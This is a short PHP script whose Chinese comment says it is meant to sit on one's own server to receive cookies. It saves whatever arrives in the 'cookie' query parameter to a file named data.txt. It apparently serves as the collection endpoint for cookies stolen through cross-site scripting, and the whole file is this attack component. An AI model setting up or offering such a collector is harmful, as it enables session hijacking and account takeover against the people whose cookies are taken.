<?php
#此脚本放在自己服务，用来接收cookie
file_put_contents("data.txt",$_GET['cookie']);
?>